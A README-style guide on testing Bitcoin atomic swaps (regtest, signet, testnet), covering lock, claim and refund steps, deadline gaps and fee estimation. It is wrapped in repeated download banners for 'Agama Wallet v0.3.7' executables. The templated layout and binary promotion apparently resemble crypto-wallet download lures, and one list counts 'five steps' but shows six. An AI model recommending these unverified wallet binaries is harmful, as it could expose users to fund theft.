[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# Testing Atomic Swaps on Signet and Testnet

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

An atomic swap can be rehearsed end to end on Bitcoin's test networks before any real value is involved: two nodes, two funded test wallets, and the same lock-claim-refund sequence the main chain uses. Signet and testnet behave like Bitcoin with worthless coins, which makes them the cheapest place to see what a timeout looks like. Agama Wallet is a self-custody multi-asset wallet for the Komodo ecosystem with built-in atomic swaps, and the sequence it uses is the one these networks exercise.

## You'll see this if

You are implementing or evaluating swap software and want to see a lock, a claim and a refund without risking funds, or you have read the sequence and want to watch it happen on a chain you control.

| Environment | Coins | What it is good for | What it is not |
|---|---|---|---|
| Regtest | Generated locally | Deterministic block production, instant confirmation | Behaves differently from a public network |
| Signet | Faucet-issued, worthless | Realistic block times with stable behaviour | Not identical to mainnet |
| Testnet | Faucet-issued, worthless | Wide compatibility with existing tooling | Unreliable block production at times |
| Mainnet | Real value | The only place that proves real settlement | Costs money and mistakes are final |

## Why it happens

The swap logic depends on three things that are hard to observe on mainnet: a deadline expressed in blocks, a secret that must stay hidden until a claim, and a second chain that confirms on its own schedule.

Test networks let you control all three. On regtest you produce blocks on demand, so a deadline can be reached in seconds and a refund can be observed without waiting. On signet the block interval is realistic, which is useful for timing assumptions. On testnet you get the widest tooling compatibility, at the cost of unpredictable block production.

What none of them reproduce is the economic pressure of mainnet: fee markets, mempool competition and the possibility that a claim sits unconfirmed past a deadline. Those have to be reasoned about rather than tested, and [cross-chain swaps](https://github.com/agama-wallet/atomic-swaps/blob/main/moving-value-between-chains.md) covers the timing constraints they create.

## Fix

A rehearsal that proves something follows the same five steps as the real trade, with the failure path exercised deliberately.

1. **Set up two independent wallets on two networks or two nodes.** Independence matters; a single node hides propagation problems.
2. **Fund both from a faucet or by generating blocks.** Test coins are worthless, which is the point.
3. **Agree the parameters explicitly.** Hash of a chosen secret, both deadlines, and which side locks first.
4. **Run the happy path once.** Lock, lock, claim, claim. Record the block heights at which each step landed.
5. **Then run the failure path.** Lock, lock, do nothing, and let the deadlines pass. Confirm both refunds succeed.
6. **Measure the gap between the deadlines.** It must be long enough for the second party to claim after the secret is public.

The sequence being rehearsed is set out in [how atomic swaps work](https://github.com/agama-wallet/atomic-swaps/blob/main/step-by-step-mechanics.md), and the contract in [HTLC explained](https://github.com/agama-wallet/atomic-swaps/blob/main/hash-time-locked-contracts.md).

## If that did not work

If the happy path stalls at the second lock, the two nodes are probably not seeing each other's transactions: check connectivity and mempool acceptance before changing the swap logic.

If a refund fails on regtest, the deadline may not have been reached. Generate the blocks rather than waiting; regtest does not advance on its own.

If a claim works on regtest but not on signet, the difference is usually fee estimation. A hard-coded fee that is fine on a local chain can be far too low for a public one, and the failure looks like a stuck trade.

If the failure path leaves one leg locked indefinitely, the deadline arithmetic is wrong: the second party's deadline must be later than the first, and both must be expressed in the same unit the script understands.

## Prevention

- **Rehearse the failure path, not only the happy one.** A refund that was never tested is a refund you cannot rely on.
- **Record block heights, not timestamps.** Deadlines are block-based and clocks drift.
- **Test with two independent nodes.** One node proves nothing about propagation.
- **Keep fee estimation configurable.** Fixed fees break on public networks.
- **Do not conclude from regtest alone.** Confirm on a network with real block intervals before trusting timings, because regtest removes the delay that causes most production stalls.

## FAQ

### Why use signet rather than testnet?

Signet has more predictable block production and a controlled faucet, which makes timing behaviour easier to observe. Testnet remains useful when a tool only supports it, which is still common.

### What does regtest give me that the others do not?

Control over block production. You can reach a deadline immediately, which makes refunds and timeouts quick to test.

### How long does a rehearsal take?

On regtest, minutes: blocks are produced on demand, so a deadline arrives as soon as you generate enough of them. On signet, expect real block intervals, so a timeout exercise takes hours rather than seconds.

### Can a swap be tested with real coins safely?

Only by using amounts small enough that a total loss would not matter. Test networks exist precisely so that this is unnecessary.

### What is the smallest useful rehearsal?

Two wallets, two deadlines, one happy path and one timeout. That covers the two outcomes that matter and takes an afternoon on regtest. Anything less leaves the refund path unproven, which is the path a stuck trade depends on.

### Do test-network swaps prove mainnet behaviour?

They prove the sequence and the contract logic. They do not prove fee behaviour under congestion, which is the part most likely to cause a stall on mainnet.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [How Atomic Swaps Work, Step by Step](https://github.com/agama-wallet/atomic-swaps/blob/main/step-by-step-mechanics.md)
- [HTLC Explained: Hash Time-Locked Contracts](https://github.com/agama-wallet/atomic-swaps/blob/main/hash-time-locked-contracts.md)
- [When an Atomic Swap Fails: Timeouts and Refunds](https://github.com/agama-wallet/atomic-swaps/blob/main/timeouts-and-refunds.md)
- [What an Atomic Swap Costs: Fees, Mining Costs and Spread](https://github.com/agama-wallet/atomic-swaps/blob/main/what-a-trade-costs.md)
